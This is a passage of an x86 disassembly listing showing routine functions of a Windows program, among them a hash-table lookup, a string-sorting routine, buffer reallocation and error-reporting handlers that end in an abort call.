  406c11:	call   0x407010
  406c16:	int3   
  406c17:	int3   
  406c18:	int3   
  406c19:	int3   
  406c1a:	int3   
  406c1b:	int3   
  406c1c:	int3   
  406c1d:	int3   
  406c1e:	int3   
  406c1f:	int3   
  406c20:	push   ebp
  406c21:	mov    ebp,esp
  406c23:	mov    eax,DWORD PTR [ebp+0x8]
  406c26:	push   esi
  406c27:	push   edi
  406c28:	sub    esp,0x8
  406c2b:	mov    ecx,esp
  406c2d:	mov    DWORD PTR [ecx],eax
  406c2f:	mov    ax,WORD PTR [ebp+0xc]
  406c33:	mov    WORD PTR [ecx+0x4],ax
  406c37:	mov    al,BYTE PTR [ebp+0xe]
  406c3a:	mov    BYTE PTR [ecx+0x6],al
  406c3d:	call   DWORD PTR ds:0x40e060
  406c43:	movzx  eax,ax
  406c46:	cdq    
  406c47:	idiv   DWORD PTR ds:0x40e05c
  406c4d:	mov    eax,ds:0x40e054
  406c52:	add    esp,0x8
  406c55:	lea    edi,[eax+edx*4]
  406c58:	mov    eax,DWORD PTR [edi]
  406c5a:	test   eax,eax
  406c5c:	je     0x406c86
  406c5e:	mov    cx,WORD PTR [ebp+0xd]
  406c62:	mov    dx,WORD PTR [ebp+0xc]
  406c66:	mov    esi,DWORD PTR [ebp+0x8]
  406c69:	lea    esp,[esp+0x0]
  406c70:	cmp    esi,DWORD PTR [eax+0x4]
  406c73:	jne    0x406c80
  406c75:	cmp    dl,BYTE PTR [eax+0x8]
  406c78:	jne    0x406c80
  406c7a:	cmp    cx,WORD PTR [eax+0x9]
  406c7e:	je     0x406c93
  406c80:	mov    eax,DWORD PTR [eax]
  406c82:	test   eax,eax
  406c84:	jne    0x406c70
  406c86:	mov    eax,DWORD PTR [ebp+0x10]
  406c89:	mov    DWORD PTR [eax],edi
  406c8b:	xor    eax,eax
  406c8d:	pop    edi
  406c8e:	pop    esi
  406c8f:	pop    ebp
  406c90:	ret    0xc
  406c93:	mov    ecx,DWORD PTR [ebp+0x10]
  406c96:	pop    edi
  406c97:	mov    DWORD PTR [ecx],eax
  406c99:	mov    eax,0x1
  406c9e:	pop    esi
  406c9f:	pop    ebp
  406ca0:	ret    0xc
  406ca3:	int3   
  406ca4:	int3   
  406ca5:	int3   
  406ca6:	int3   
  406ca7:	int3   
  406ca8:	int3   
  406ca9:	int3   
  406caa:	int3   
  406cab:	int3   
  406cac:	int3   
  406cad:	int3   
  406cae:	int3   
  406caf:	int3   
  406cb0:	push   ebp
  406cb1:	mov    ebp,esp
  406cb3:	sub    esp,0x10
  406cb6:	push   ebx
  406cb7:	push   esi
  406cb8:	mov    esi,DWORD PTR [ebp+0x8]
  406cbb:	push   edi
  406cbc:	lea    eax,[esi+0x1]
  406cbf:	mov    DWORD PTR [ebp-0x8],edx
  406cc2:	mov    DWORD PTR [ebp-0x4],ecx
  406cc5:	mov    DWORD PTR [ebp-0xc],eax
  406cc8:	mov    edi,edx
  406cca:	cmp    edx,esi
  406ccc:	jge    0x406e98
  406cd2:	mov    ecx,DWORD PTR ds:0x4244bc
  406cd8:	jmp    0x406ce0
  406cda:	lea    ebx,[ebx+0x0]
  406ce0:	mov    eax,DWORD PTR [ebp-0x4]
  406ce3:	lea    ebx,[edi*8+0x4]
  406cea:	add    ebx,eax
  406cec:	lea    esp,[esp+0x0]
  406cf0:	inc    edi
  406cf1:	mov    DWORD PTR [ebp-0x10],edi
  406cf4:	lea    ebx,[ebx+0x8]
  406cf7:	cmp    edi,esi
  406cf9:	jge    0x406d61
  406cfb:	mov    edi,DWORD PTR [ebx]
  406cfd:	mov    esi,DWORD PTR [eax+edx*8+0x4]
  406d01:	cmp    WORD PTR [edi],0x3f
  406d05:	jne    0x406d0a
  406d07:	add    edi,0x2
  406d0a:	cmp    WORD PTR [esi],0x3f
  406d0e:	jne    0x406d13
  406d10:	add    esi,0x2
  406d13:	push   esi
  406d14:	push   edi
  406d15:	call   ecx
  406d17:	add    esp,0x8
  406d1a:	test   eax,eax
  406d1c:	jne    0x406d4d
  406d1e:	mov    edi,edi
  406d20:	mov    ax,WORD PTR [edi]
  406d23:	cmp    ax,WORD PTR [esi]
  406d26:	jne    0x406d46
  406d28:	test   ax,ax
  406d2b:	je     0x406d42
  406d2d:	mov    ax,WORD PTR [edi+0x2]
  406d31:	cmp    ax,WORD PTR [esi+0x2]
  406d35:	jne    0x406d46
  406d37:	add    edi,0x4
  406d3a:	add    esi,0x4
  406d3d:	test   ax,ax
  406d40:	jne    0x406d20
  406d42:	xor    eax,eax
  406d44:	jmp    0x406d4b
  406d46:	sbb    eax,eax
  406d48:	or     eax,0x1
  406d4b:	test   eax,eax
  406d4d:	mov    edi,DWORD PTR [ebp-0x10]
  406d50:	mov    edx,DWORD PTR [ebp-0x8]
  406d53:	mov    eax,DWORD PTR [ebp-0x4]
  406d56:	mov    ecx,DWORD PTR ds:0x4244bc
  406d5c:	mov    esi,DWORD PTR [ebp+0x8]
  406d5f:	jle    0x406cf0
  406d61:	mov    esi,DWORD PTR [ebp-0xc]
  406d64:	lea    ebx,[esi*8+0x4]
  406d6b:	add    ebx,eax
  406d6d:	lea    ecx,[ecx+0x0]
  406d70:	dec    esi
  406d71:	mov    DWORD PTR [ebp-0xc],esi
  406d74:	lea    ebx,[ebx-0x8]
  406d77:	cmp    esi,edx
  406d79:	jle    0x406dde
  406d7b:	mov    edi,DWORD PTR [ebx]
  406d7d:	mov    esi,DWORD PTR [eax+edx*8+0x4]
  406d81:	cmp    WORD PTR [edi],0x3f
  406d85:	jne    0x406d8a
  406d87:	add    edi,0x2
  406d8a:	cmp    WORD PTR [esi],0x3f
  406d8e:	jne    0x406d93
  406d90:	add    esi,0x2
  406d93:	push   esi
  406d94:	push   edi
  406d95:	call   ecx
  406d97:	add    esp,0x8
  406d9a:	test   eax,eax
  406d9c:	jne    0x406dcd
  406d9e:	mov    edi,edi
  406da0:	mov    ax,WORD PTR [edi]
  406da3:	cmp    ax,WORD PTR [esi]
  406da6:	jne    0x406dc6
  406da8:	test   ax,ax
  406dab:	je     0x406dc2
  406dad:	mov    ax,WORD PTR [edi+0x2]
  406db1:	cmp    ax,WORD PTR [esi+0x2]
  406db5:	jne    0x406dc6
  406db7:	add    edi,0x4
  406dba:	add    esi,0x4
  406dbd:	test   ax,ax
  406dc0:	jne    0x406da0
  406dc2:	xor    eax,eax
  406dc4:	jmp    0x406dcb
  406dc6:	sbb    eax,eax
  406dc8:	or     eax,0x1
  406dcb:	test   eax,eax
  406dcd:	mov    esi,DWORD PTR [ebp-0xc]
  406dd0:	mov    edx,DWORD PTR [ebp-0x8]
  406dd3:	mov    eax,DWORD PTR [ebp-0x4]
  406dd6:	mov    ecx,DWORD PTR ds:0x4244bc
  406ddc:	jns    0x406d70
  406dde:	mov    edi,DWORD PTR [ebp-0x10]
  406de1:	mov    ebx,DWORD PTR [ebp-0x4]
  406de4:	cmp    esi,edi
  406de6:	jle    0x406e17
  406de8:	mov    ecx,DWORD PTR [eax+edi*8]
  406deb:	mov    edx,DWORD PTR [eax+edi*8+0x4]
  406def:	mov    eax,DWORD PTR [eax+esi*8]
  406df2:	mov    DWORD PTR [ebx+edi*8],eax
  406df5:	mov    eax,DWORD PTR [ebx+esi*8+0x4]
  406df9:	mov    DWORD PTR [ebx+edi*8+0x4],eax
  406dfd:	mov    eax,ebx
  406dff:	mov    DWORD PTR [eax+esi*8],ecx
  406e02:	mov    ecx,DWORD PTR ds:0x4244bc
  406e08:	mov    DWORD PTR [eax+esi*8+0x4],edx
  406e0c:	mov    edx,DWORD PTR [ebp-0x8]
  406e0f:	mov    esi,DWORD PTR [ebp+0x8]
  406e12:	jmp    0x406ce3
  406e17:	mov    ecx,DWORD PTR [eax+edx*8]
  406e1a:	mov    edx,DWORD PTR [eax+edx*8+0x4]
  406e1e:	mov    eax,DWORD PTR [eax+esi*8]
  406e21:	mov    edi,DWORD PTR [ebp-0x8]
  406e24:	mov    DWORD PTR [ebx+edi*8],eax
  406e27:	mov    eax,DWORD PTR [ebx+esi*8+0x4]
  406e2b:	mov    DWORD PTR [ebx+edi*8+0x4],eax
  406e2f:	mov    DWORD PTR [ebx+esi*8+0x4],edx
  406e33:	mov    edx,DWORD PTR [ebp+0x8]
  406e36:	mov    DWORD PTR [ebx+esi*8],ecx
  406e39:	mov    ecx,edx
  406e3b:	mov    eax,esi
  406e3d:	sub    ecx,esi
  406e3f:	sub    eax,edi
  406e41:	cmp    eax,ecx
  406e43:	jl     0x406e62
  406e45:	push   edx
  406e46:	lea    edx,[esi+0x1]
  406e49:	mov    ecx,ebx
  406e4b:	call   0x406cb0
  406e50:	mov    edx,edi
  406e52:	add    esp,0x4
  406e55:	lea    eax,[edx+0x1]
  406e58:	cmp    eax,esi
  406e5a:	jge    0x406e98
  406e5c:	dec    esi
  406e5d:	mov    DWORD PTR [ebp+0x8],esi
  406e60:	jmp    0x406e88
  406e62:	lea    eax,[edi+0x1]
  406e65:	cmp    eax,esi
  406e67:	jge    0x406e79
  406e69:	lea    eax,[esi-0x1]
  406e6c:	push   eax
  406e6d:	mov    edx,edi
  406e6f:	mov    ecx,ebx
  406e71:	call   0x406cb0
  406e76:	add    esp,0x4
  406e79:	lea    edx,[esi+0x1]
  406e7c:	mov    esi,DWORD PTR [ebp+0x8]
  406e7f:	mov    DWORD PTR [ebp-0x8],edx
  406e82:	lea    eax,[esi+0x1]
  406e85:	mov    DWORD PTR [ebp-0xc],eax
  406e88:	mov    ecx,DWORD PTR ds:0x4244bc
  406e8e:	mov    edi,edx
  406e90:	cmp    edx,esi
  406e92:	jl     0x406ce0
  406e98:	pop    edi
  406e99:	pop    esi
  406e9a:	pop    ebx
  406e9b:	mov    esp,ebp
  406e9d:	pop    ebp
  406e9e:	ret    
  406e9f:	int3   
  406ea0:	push   ebp
  406ea1:	mov    ebp,esp
  406ea3:	push   ebx
  406ea4:	mov    ebx,DWORD PTR [ebp+0x8]
  406ea7:	push   edi
  406ea8:	mov    edi,ecx
  406eaa:	mov    eax,0x7fffffff
  406eaf:	mov    ecx,DWORD PTR [edi+0x8]
  406eb2:	sub    eax,ecx
  406eb4:	cmp    eax,ebx
  406eb6:	jae    0x406ec0
  406eb8:	pop    edi
  406eb9:	xor    eax,eax
  406ebb:	pop    ebx
  406ebc:	pop    ebp
  406ebd:	ret    0x4
  406ec0:	cmp    BYTE PTR [edi+0x14],0x0
  406ec4:	push   esi
  406ec5:	je     0x406ef2
  406ec7:	mov    eax,ecx
  406ec9:	cdq    
  406eca:	sub    eax,edx
  406ecc:	sar    eax,1
  406ece:	cmp    ebx,eax
  406ed0:	jle    0x406ed4
  406ed2:	mov    eax,ebx
  406ed4:	add    ecx,eax
  406ed6:	mov    eax,ds:0x40eaf4
  406edb:	lea    esi,[eax-0x1]
  406ede:	dec    eax
  406edf:	not    eax
  406ee1:	add    esi,ecx
  406ee3:	and    esi,eax
  406ee5:	mov    eax,DWORD PTR [edi+0x8]
  406ee8:	add    eax,ebx
  406eea:	cmp    eax,esi
  406eec:	jle    0x406ef5
  406eee:	mov    esi,eax
  406ef0:	jmp    0x406ef5
  406ef2:	lea    esi,[ecx+ebx*1]
  406ef5:	push   esi
  406ef6:	push   0x0
  406ef8:	push   DWORD PTR ds:0x40e648
  406efe:	call   DWORD PTR ds:0x4242c4
  406f04:	mov    ebx,eax
  406f06:	test   ebx,ebx
  406f08:	je     0x406f69
  406f0a:	mov    ecx,DWORD PTR [edi]
  406f0c:	mov    DWORD PTR [edi+0x8],esi
  406f0f:	mov    esi,DWORD PTR [edi+0x4]
  406f12:	sub    esi,ecx
  406f14:	push   esi
  406f15:	push   ecx
  406f16:	push   ebx
  406f17:	call   0x40db6c
  406f1c:	mov    ecx,DWORD PTR [edi]
  406f1e:	add    esp,0xc
  406f21:	lea    eax,[esi+ebx*1]
  406f24:	mov    DWORD PTR [ebp+0x8],ecx
  406f27:	mov    DWORD PTR [edi],ebx
  406f29:	mov    DWORD PTR [edi+0x4],eax
  406f2c:	cmp    ecx,ebx
  406f2e:	je     0x406f44
  406f30:	mov    eax,DWORD PTR [edi+0xc]
  406f33:	test   eax,eax
  406f35:	je     0x406f44
  406f37:	push   ebx
  406f38:	push   ecx
  406f39:	push   DWORD PTR [edi+0x10]
  406f3c:	call   eax
  406f3e:	mov    ecx,DWORD PTR [ebp+0x8]
  406f41:	add    esp,0xc
  406f44:	test   ecx,ecx
  406f46:	je     0x406f57
  406f48:	push   ecx
  406f49:	push   0x0
  406f4b:	push   DWORD PTR ds:0x40e648
  406f51:	call   DWORD PTR ds:0x4242c0
  406f57:	mov    al,BYTE PTR [edi+0x15]
  406f5a:	pop    esi
  406f5b:	mov    BYTE PTR [edi+0x14],al
  406f5e:	pop    edi
  406f5f:	mov    eax,0x1
  406f64:	pop    ebx
  406f65:	pop    ebp
  406f66:	ret    0x4
  406f69:	pop    esi
  406f6a:	pop    edi
  406f6b:	xor    eax,eax
  406f6d:	pop    ebx
  406f6e:	pop    ebp
  406f6f:	ret    0x4
  406f72:	int3   
  406f73:	int3   
  406f74:	int3   
  406f75:	int3   
  406f76:	int3   
  406f77:	int3   
  406f78:	int3   
  406f79:	int3   
  406f7a:	int3   
  406f7b:	int3   
  406f7c:	int3   
  406f7d:	int3   
  406f7e:	int3   
  406f7f:	int3   
  406f80:	push   ebp
  406f81:	mov    ebp,esp
  406f83:	push   esi
  406f84:	push   edi
  406f85:	mov    edi,DWORD PTR [ebp+0x8]
  406f88:	mov    esi,ecx
  406f8a:	test   edi,edi
  406f8c:	js     0x406f9a
  406f8e:	mov    eax,DWORD PTR [esi+0x8]
  406f91:	sub    eax,DWORD PTR [esi+0x4]
  406f94:	add    eax,DWORD PTR [esi]
  406f96:	cmp    edi,eax
  406f98:	jle    0x406faa
  406f9a:	push   edi
  406f9b:	call   0x406ea0
  406fa0:	test   eax,eax
  406fa2:	jne    0x406faa
  406fa4:	pop    edi
  406fa5:	pop    esi
  406fa6:	pop    ebp
  406fa7:	ret    0x8
  406faa:	mov    ecx,DWORD PTR [ebp+0xc]
  406fad:	test   ecx,ecx
  406faf:	je     0x406fb6
  406fb1:	mov    eax,DWORD PTR [esi+0x4]
  406fb4:	mov    DWORD PTR [ecx],eax
  406fb6:	push   edi
  406fb7:	push   0x0
  406fb9:	push   DWORD PTR [esi+0x4]
  406fbc:	call   0x40db72
  406fc1:	mov    ecx,DWORD PTR [esi+0x4]
  406fc4:	mov    eax,DWORD PTR [esi]
  406fc6:	add    esp,0xc
  406fc9:	add    ecx,edi
  406fcb:	test   eax,eax
  406fcd:	jne    0x406fdf
  406fcf:	mov    DWORD PTR [esi+0x4],eax
  406fd2:	mov    DWORD PTR [esi],eax
  406fd4:	pop    edi
  406fd5:	mov    eax,0x1
  406fda:	pop    esi
  406fdb:	pop    ebp
  406fdc:	ret    0x8
  406fdf:	mov    DWORD PTR [esi+0x4],ecx
  406fe2:	cmp    eax,eax
  406fe4:	je     0x406ff7
  406fe6:	mov    ecx,DWORD PTR [esi+0xc]
  406fe9:	test   ecx,ecx
  406feb:	je     0x406ff7
  406fed:	push   eax
  406fee:	push   eax
  406fef:	push   DWORD PTR [esi+0x10]
  406ff2:	call   ecx
  406ff4:	add    esp,0xc
  406ff7:	pop    edi
  406ff8:	mov    eax,0x1
  406ffd:	pop    esi
  406ffe:	pop    ebp
  406fff:	ret    0x8
  407002:	int3   
  407003:	int3   
  407004:	int3   
  407005:	int3   
  407006:	int3   
  407007:	int3   
  407008:	int3   
  407009:	int3   
  40700a:	int3   
  40700b:	int3   
  40700c:	int3   
  40700d:	int3   
  40700e:	int3   
  40700f:	int3   
  407010:	push   ebp
  407011:	mov    ebp,esp
  407013:	sub    esp,0x264
  407019:	mov    eax,ds:0x40e018
  40701e:	xor    eax,ebp
  407020:	mov    DWORD PTR [ebp-0x8],eax
  407023:	cmp    BYTE PTR ds:0x40eaf1,0x0
  40702a:	push   esi
  40702b:	push   edi
  40702c:	mov    edi,edx
  40702e:	mov    esi,ecx
  407030:	jne    0x407068
  407032:	mov    ecx,0x7d0
  407037:	mov    BYTE PTR ds:0x40eaf1,0x1
  40703e:	call   0x4096d0
  407043:	push   eax
  407044:	push   0x401968
  407049:	call   0x40d1c0
  40704e:	push   0x401970
  407053:	call   0x40d1c0
  407058:	add    esp,0xc
  40705b:	push   0x4019a0
  407060:	call   0x40d1c0
  407065:	add    esp,0x4
  407068:	push   esi
  407069:	push   0x401158
  40706e:	push   0x401164
  407073:	call   0x40d1c0
  407078:	add    esp,0xc
  40707b:	push   edi
  40707c:	push   ecx
  40707d:	mov    ecx,esi
  40707f:	call   0x4096d0
  407084:	add    esp,0x4
  407087:	push   eax
  407088:	call   0x40d1c0
  40708d:	mov    eax,DWORD PTR [ebp+0x8]
  407090:	add    esp,0x8
  407093:	test   eax,eax
  407095:	je     0x4070c1
  407097:	push   eax
  407098:	lea    eax,[ebp-0x264]
  40709e:	push   0x12c
  4070a3:	push   eax
  4070a4:	call   DWORD PTR ds:0x4243c8
  4070aa:	add    esp,0xc
  4070ad:	lea    eax,[ebp-0x264]
  4070b3:	push   eax
  4070b4:	push   0x40118c
  4070b9:	call   0x40d1c0
  4070be:	add    esp,0x8
  4070c1:	push   0x401198
  4070c6:	call   0x40d1c0
  4070cb:	mov    esi,DWORD PTR ds:0x424438
  4070d1:	mov    edi,DWORD PTR ds:0x424434
  4070d7:	add    esp,0x4
  4070da:	cmp    BYTE PTR ds:0x40e8db,0x0
  4070e1:	jne    0x4070ee
  4070e3:	call   edi
  4070e5:	add    eax,0x20
  4070e8:	push   eax
  4070e9:	call   esi
  4070eb:	add    esp,0x4
  4070ee:	cmp    BYTE PTR ds:0x40e8da,0x0
  4070f5:	jne    0x407102
  4070f7:	call   edi
  4070f9:	add    eax,0x40
  4070fc:	push   eax
  4070fd:	call   esi
  4070ff:	add    esp,0x4
  407102:	call   0x407400
  407107:	int3   
  407108:	int3   
  407109:	int3   
  40710a:	int3   
  40710b:	int3   
  40710c:	int3   
  40710d:	int3   
  40710e:	int3   
  40710f:	int3   
  407110:	push   ecx
  407111:	push   0x0
  407113:	call   0x407010
  407118:	int3   
  407119:	int3   
  40711a:	int3   
  40711b:	int3   
  40711c:	int3   
  40711d:	int3   
  40711e:	int3   
  40711f:	int3   
  407120:	push   ebp
  407121:	mov    ebp,esp
  407123:	cmp    BYTE PTR ds:0x40eaf1,0x0
  40712a:	push   esi
  40712b:	mov    si,dx
  40712e:	jne    0x407163
  407130:	mov    ecx,0x7d0
  407135:	mov    BYTE PTR ds:0x40eaf1,0x1
  40713c:	call   0x4096d0
  407141:	push   eax
  407142:	push   0x401968
  407147:	call   0x40d1c0
  40714c:	push   0x401970
  407151:	call   0x40d1c0
  407156:	push   0x4019a0
  40715b:	call   0x40d1c0
  407160:	add    esp,0x10
  407163:	push   0x5dd
  407168:	push   0x401158
  40716d:	push   0x401164
  407172:	call   0x40d1c0
  407177:	add    esp,0xc
  40717a:	movzx  eax,si
  40717d:	push   DWORD PTR [ebp+0x8]
  407180:	mov    ecx,0x5dd
  407185:	push   eax
  407186:	call   0x4096d0
  40718b:	push   eax
  40718c:	call   0x40d1c0
  407191:	push   0x401198
  407196:	call   0x40d1c0
  40719b:	mov    esi,DWORD PTR ds:0x424438
  4071a1:	add    esp,0x10
  4071a4:	cmp    BYTE PTR ds:0x40e8db,0x0
  4071ab:	jne    0x4071bc
  4071ad:	call   DWORD PTR ds:0x424434
  4071b3:	add    eax,0x20
  4071b6:	push   eax
  4071b7:	call   esi
  4071b9:	add    esp,0x4
  4071bc:	cmp    BYTE PTR ds:0x40e8da,0x0
  4071c3:	jne    0x4071d4
  4071c5:	call   DWORD PTR ds:0x424434
  4071cb:	add    eax,0x40
  4071ce:	push   eax
  4071cf:	call   esi
  4071d1:	add    esp,0x4
  4071d4:	call   0x407400
  4071d9:	int3   
  4071da:	int3   
  4071db:	int3   
  4071dc:	int3   
  4071dd:	int3   
  4071de:	int3   
  4071df:	int3   
  4071e0:	push   ecx
  4071e1:	cmp    BYTE PTR ds:0x40eaf1,0x0
  4071e8:	push   esi
  4071e9:	push   edi
  4071ea:	mov    edi,edx
  4071ec:	mov    esi,ecx
  4071ee:	jne    0x407226
  4071f0:	mov    ecx,0x7d0
  4071f5:	mov    BYTE PTR ds:0x40eaf1,0x1
  4071fc:	call   0x4096d0
  407201:	push   eax
  407202:	push   0x401968
  407207:	call   0x40d1c0
  40720c:	push   0x401970
  407211:	call   0x40d1c0
  407216:	add    esp,0xc
  407219:	push   0x4019a0
  40721e:	call   0x40d1c0
  407223:	add    esp,0x4
  407226:	push   esi
  407227:	push   0x401148
  40722c:	push   0x401164
  407231:	call   0x40d1c0
  407236:	add    esp,0xc
  407239:	push   edi
  40723a:	push   ecx
  40723b:	mov    ecx,esi
  40723d:	call   0x4096d0
  407242:	add    esp,0x4
  407245:	push   eax
  407246:	call   0x40d1c0
  40724b:	push   0x401198
  407250:	call   0x40d1c0
  407255:	mov    esi,DWORD PTR ds:0x424438
  40725b:	mov    edi,DWORD PTR ds:0x424434
  407261:	add    esp,0xc
  407264:	cmp    BYTE PTR ds:0x40e8db,0x0
  40726b:	jne    0x407278
  40726d:	call   edi
  40726f:	add    eax,0x20
  407272:	push   eax
  407273:	call   esi
  407275:	add    esp,0x4
  407278:	cmp    BYTE PTR ds:0x40e8da,0x0
  40727f:	jne    0x40728c
  407281:	call   edi
  407283:	add    eax,0x40
  407286:	push   eax
  407287:	call   esi
  407289:	add    esp,0x4
  40728c:	pop    edi
  40728d:	pop    esi
  40728e:	pop    ecx
  40728f:	ret    
  407290:	cmp    BYTE PTR ds:0x40eaf1,0x0
  407297:	push   esi
  407298:	push   edi
  407299:	mov    edi,DWORD PTR ds:0x40e644
  40729f:	mov    esi,edx
  4072a1:	jne    0x4072d6
  4072a3:	mov    ecx,0x7d0
  4072a8:	mov    BYTE PTR ds:0x40eaf1,0x1
  4072af:	call   0x4096d0
  4072b4:	push   eax
  4072b5:	push   0x401968
  4072ba:	call   0x40d1c0
  4072bf:	push   0x401970
  4072c4:	call   0x40d1c0
  4072c9:	push   0x4019a0
  4072ce:	call   0x40d1c0
  4072d3:	add    esp,0x10
  4072d6:	push   0x1196
  4072db:	push   0x401148
  4072e0:	push   0x401164
  4072e5:	call   0x40d1c0
  4072ea:	add    esp,0xc
  4072ed:	mov    ecx,0x1196
  4072f2:	push   edi
  4072f3:	push   esi
  4072f4:	call   0x4096d0
  4072f9:	push   eax
  4072fa:	call   0x40d1c0
  4072ff:	push   0x401198
  407304:	call   0x40d1c0
  407309:	mov    esi,DWORD PTR ds:0x424438
  40730f:	mov    edi,DWORD PTR ds:0x424434
  407315:	add    esp,0x10
  407318:	cmp    BYTE PTR ds:0x40e8db,0x0
  40731f:	jne    0x40732c
  407321:	call   edi
  407323:	add    eax,0x20
  407326:	push   eax
  407327:	call   esi
  407329:	add    esp,0x4
  40732c:	cmp    BYTE PTR ds:0x40e8da,0x0
  407333:	jne    0x407340
  407335:	call   edi
  407337:	add    eax,0x40
  40733a:	push   eax
  40733b:	call   esi
  40733d:	add    esp,0x4
  407340:	pop    edi
  407341:	pop    esi
  407342:	ret    
  407343:	int3   
  407344:	int3   
  407345:	int3   
  407346:	int3   
  407347:	int3   
  407348:	int3   
  407349:	int3   
  40734a:	int3   
  40734b:	int3   
  40734c:	int3   
  40734d:	int3   
  40734e:	int3   
  40734f:	int3   
  407350:	push   ebp
  407351:	mov    ebp,esp
  407353:	push   ecx
  407354:	cmp    BYTE PTR ds:0x40eaf1,0x0
  40735b:	jne    0x407393
  40735d:	mov    ecx,0x7d0
  407362:	mov    BYTE PTR ds:0x40eaf1,0x1
  407369:	call   0x4096d0
  40736e:	push   eax
  40736f:	push   0x401968
  407374:	call   0x40d1c0
  407379:	push   0x401970
  40737e:	call   0x40d1c0
  407383:	add    esp,0xc
  407386:	push   0x4019a0
  40738b:	call   0x40d1c0
  407390:	add    esp,0x4
  407393:	push   DWORD PTR [ebp+0x8]
  407396:	push   0x401148
  40739b:	push   DWORD PTR [ebp+0x10]
  40739e:	push   DWORD PTR [ebp+0xc]
  4073a1:	push   0x40119c
  4073a6:	call   0x40d1c0
  4073ab:	mov    ecx,DWORD PTR [ebp+0x8]
  4073ae:	add    esp,0x14
  4073b1:	call   0x4096d0
  4073b6:	cmp    BYTE PTR ds:0x40e8db,0x0
  4073bd:	lea    ecx,[ebp+0x14]
  4073c0:	push   ecx
  4073c1:	push   eax
  4073c2:	je     0x4073dd
  4073c4:	call   DWORD PTR ds:0x42443c
  4073ca:	add    esp,0x8
  4073cd:	push   0x401198
  4073d2:	call   0x40d1c0
  4073d7:	add    esp,0x4
  4073da:	pop    ecx
  4073db:	pop    ebp
  4073dc:	ret    
  4073dd:	call   DWORD PTR ds:0x424434
  4073e3:	add    eax,0x20
  4073e6:	push   eax
  4073e7:	call   DWORD PTR ds:0x424440
  4073ed:	add    esp,0xc
  4073f0:	push   0x401198
  4073f5:	call   0x40d1c0
  4073fa:	add    esp,0x4
  4073fd:	pop    ecx
  4073fe:	pop    ebp
  4073ff:	ret    
  407400:	push   ebp
  407401:	mov    ebp,esp
  407403:	sub    esp,0x1c
  407406:	mov    eax,ds:0x40e018
  40740b:	xor    eax,ebp
  40740d:	mov    DWORD PTR [ebp-0x4],eax
  407410:	cmp    BYTE PTR ds:0x422bb8,0x0
  407417:	push   ebx
  407418:	push   esi
  407419:	push   edi
  40741a:	jne    0x4074aa
  407420:	mov    ecx,DWORD PTR ds:0x40e430
  407426:	mov    BYTE PTR ds:0x422bb8,0x1
  40742d:	test   ecx,ecx
  40742f:	je     0x407435
  407431:	mov    eax,DWORD PTR [ecx]
  407433:	call   DWORD PTR [eax]
  407435:	mov    ecx,DWORD PTR ds:0x40e42c
  40743b:	test   ecx,ecx
  40743d:	je     0x4074aa
  40743f:	mov    eax,DWORD PTR [ecx]
  407441:	call   DWORD PTR [eax+0x2c]
  407444:	cmp    BYTE PTR ds:0x40e691,0x0
  40744b:	je     0x407462
  40744d:	mov    eax,ds:0x40e644
  407452:	test   eax,eax
  407454:	je     0x4074aa
  407456:	push   eax
  407457:	call   DWORD PTR ds:0x42438c
  40745d:	add    esp,0x4
  407460:	jmp    0x4074aa
  407462:	mov    ecx,DWORD PTR ds:0x40e644
  407468:	test   ecx,ecx
  40746a:	je     0x4074aa
  40746c:	mov    edx,DWORD PTR ds:0x40e670
  407472:	mov    esi,DWORD PTR ds:0x40e674
  407478:	mov    eax,edx
  40747a:	or     eax,esi
  40747c:	je     0x4074aa
  40747e:	mov    edi,DWORD PTR ds:0x40e678
  407484:	mov    ebx,DWORD PTR ds:0x40e67c
  40748a:	mov    eax,edi
  40748c:	or     eax,ebx
  40748e:	je     0x4074aa
  407490:	lea    eax,[ebp-0x18]
  407493:	push   eax
  407494:	push   ecx
  407495:	mov    DWORD PTR [ebp-0x18],edx
  407498:	mov    DWORD PTR [ebp-0x14],esi
  40749b:	mov    DWORD PTR [ebp-0x10],edi
  40749e:	mov    DWORD PTR [ebp-0xc],ebx
  4074a1:	call   DWORD PTR ds:0x424390
  4074a7:	add    esp,0x8
  4074aa:	push   0x4
  4074ac:	call   DWORD PTR ds:0x424394
  4074b2:	int3   
  4074b3:	int3   
  4074b4:	int3   
  4074b5:	int3   
  4074b6:	int3   
  4074b7:	int3   
  4074b8:	int3   
  4074b9:	int3   
  4074ba:	int3   
  4074bb:	int3   
  4074bc:	int3   
  4074bd:	int3   
  4074be:	int3   
  4074bf:	int3   
  4074c0:	push   0x4074c0
  4074c5:	push   0x2
  4074c7:	call   DWORD PTR ds:0x424398
  4074cd:	add    esp,0x8
  4074d0:	mov    BYTE PTR ds:0x40e42a,0x1
  4074d7:	ret    
  4074d8:	int3   
  4074d9:	int3   
  4074da:	int3   
  4074db:	int3   
  4074dc:	int3   
  4074dd:	int3   
  4074de:	int3   
  4074df:	int3   
  4074e0:	push   ebx
  4074e1:	push   esi
  4074e2:	push   edi
  4074e3:	mov    edi,ecx
  4074e5:	mov    eax,edi
  4074e7:	lea    edx,[eax+0x2]
  4074ea:	lea    ebx,[ebx+0x0]
  4074f0:	mov    cx,WORD PTR [eax]
  4074f3:	add    eax,0x2
  4074f6:	test   cx,cx
  4074f9:	jne    0x4074f0
  4074fb:	sub    eax,edx
  4074fd:	sar    eax,1
  4074ff:	push   0x1
  407501:	lea    ebx,[eax+0x1]
  407504:	lea    eax,[ebx+ebx*1]
  407507:	push   eax
  407508:	call   DWORD PTR ds:0x424424
  40750e:	mov    esi,eax
  407510:	add    esp,0x8
  407513:	test   esi,esi
  407515:	je     0x407529
  407517:	push   edi
  407518:	push   ebx
  407519:	push   esi
  40751a:	call   DWORD PTR ds:0x4244b8
  407520:	add    esp,0xc
  407523:	mov    eax,esi
  407525:	pop    edi
  407526:	pop    esi
  407527:	pop    ebx
  407528:	ret    
  407529:	push   0x0
  40752b:	mov    edx,0x4010c0
  407530:	mov    ecx,0x5e5
  407535:	call   0x407010
  40753a:	int3   
  40753b:	int3   
  40753c:	int3   
  40753d:	int3   
  40753e:	int3   
  40753f:	int3   
  407540:	push   ebp
  407541:	mov    ebp,esp
  407543:	push   ecx
  407544:	push   ebx
  407545:	mov    ebx,ecx
  407547:	mov    edx,ebx
  407549:	push   esi
  40754a:	push   edi
  40754b:	lea    ecx,[edx+0x2]
  40754e:	mov    edi,edi
  407550:	mov    ax,WORD PTR [edx]
  407553:	add    edx,0x2
  407556:	test   ax,ax
  407559:	jne    0x407550
  40755b:	sub    edx,ecx
  40755d:	sar    edx,1
  40755f:	lea    esi,[edx-0x1]
  407562:	test   esi,esi
  407564:	js     0x407572
  407566:	cmp    WORD PTR [ebx+esi*2],0x2e
  40756b:	je     0x407570
